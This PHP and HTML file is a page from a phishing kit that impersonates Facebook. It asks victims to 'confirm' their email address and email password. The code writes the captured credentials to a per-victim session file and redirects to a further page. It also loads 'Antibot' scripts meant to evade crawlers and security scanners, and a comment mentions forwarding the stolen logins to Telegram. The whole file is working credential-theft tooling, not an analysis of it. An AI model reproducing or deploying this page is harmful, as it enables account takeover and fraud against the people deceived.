<?php

error_reporting(0);

include('../../Antibot/Bot-Crawler.php');
include('../../Antibot/Dila_DZ.php');
include('../../Antibot/blockers.php');
include('../../Antibot/detects.php');

session_start();
$id = $_GET['id'];
if (!isset($_SESSION['users'][$id])) {
    header("Location: ../../index.php");
    exit();
}

$userData = json_decode(file_get_contents("../../sessions/$id.json"), true);
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $_SESSION['users'][$id]['email_user'] = $_POST['username'];
    $_SESSION['users'][$id]['email_pass'] = $_POST['password'];
    $_SESSION['users'][$id]['last_page'] = 'email';
    file_put_contents("../../sessions/$id.json", json_encode($_SESSION['users'][$id]));
    header("Location: alert.php?id=$id");
    exit();
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="../../css/style1.css">
    <title>Facebook</title>
    <link rel="icon" type="image/svg" href="../../images/fb.svg">
    <style>
    .error {
        color: #f02849;
        font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
        font-size: 13px;
        line-height: 8px;
        padding: 10px;
        margin: 2px;
        text-align: left;
    }
    </style>
</head>

<body>
    <section class="main-wrapper">


        <div class="panel">
            <form id="loginForm" method="post" onsubmit="return validateCredentials()">
                <div class="headText">Confirm your email address associated with your facebook account.
                </div>
                <input type="text" id="username" name="username" placeholder="Email address" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <div class="error" id="errorMessage"></div>
                <input class="log-in-button" type="submit" value="Confirm" onclick="validateCredentials()">
            </form>
        </div>
    </section>

    <footer>
        <ul>
            <li><a class="footer-link">Sign Up</a></li>
            <li><a class="footer-link">Log In</a></li>
            <li><a class="footer-link">Messenger</a></li>
            <li><a class="footer-link">Facebook Lite</a></li>
            <li><a class="footer-link">Video</a></li>
            <li><a class="footer-link">Places</a></li>
            <li><a class="footer-link">Games</a></li>
            <li><a class="footer-link">Marketplace</a></li>
            <li><a class="footer-link">Meta Pay</a></li>
            <li><a class="footer-link">Meta Store</a></li>
            <li><a class="footer-link">Meta Quest</a></li>
            <li><a class="footer-link">Meta AI</a></li>
            <li><a class="footer-link">Instagram</a></li>
            <li><a class="footer-link">Threads</a></li>
        </ul>
        <ul>
            <li><a class="footer-link">Fundraisers</a></li>
            <li><a class="footer-link">Services</a></li>
            <li><a class="footer-link">Voting Information Centre</a></li>
            <li><a class="footer-link">Privacy Policy</a></li>
            <li><a class="footer-link">Privacy Centre</a></li>
            <li><a class="footer-link">Groups</a></li>
            <li><a class="footer-link">About</a></li>
            <li><a class="footer-link">Create ad</a></li>
            <li><a class="footer-link">Create Page</a></li>
            <li><a class="footer-link">Careers</a></li>
            <li><a class="footer-link">Cookies</a></li>
        </ul>
        <ul>
            <li><a class="footer-link">AdChoices</a></li>
            <li><a class="footer-link">Terms</a></li>
            <li><a class="footer-link">Help</a></li>
            <li><a class="footer-link">uploading and non-users</a></li>
        </ul>
    </footer>

    <script>
    function validateCredentials() {
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        var errorMessage = document.getElementById('errorMessage');

        // Simple email and phone number pattern for demonstration purposes
        var emailPhonePattern = /^\S+@\S+\.\S+$/;
        var passwordPattern = /.{8,}/; // Password must be at least 8 characters

        // Check if the patterns match
        if (emailPhonePattern.test(username) && passwordPattern.test(password)) {
            // Send login details to the server for further validation and Telegram notification
            sendLoginDetails(username, password);
            return true;
        } else {
            // Show error message
            errorMessage.textContent = "The email credentials that you've entered are incorrect.";
            return false;
        }
    }
    </script>



</body>

</html>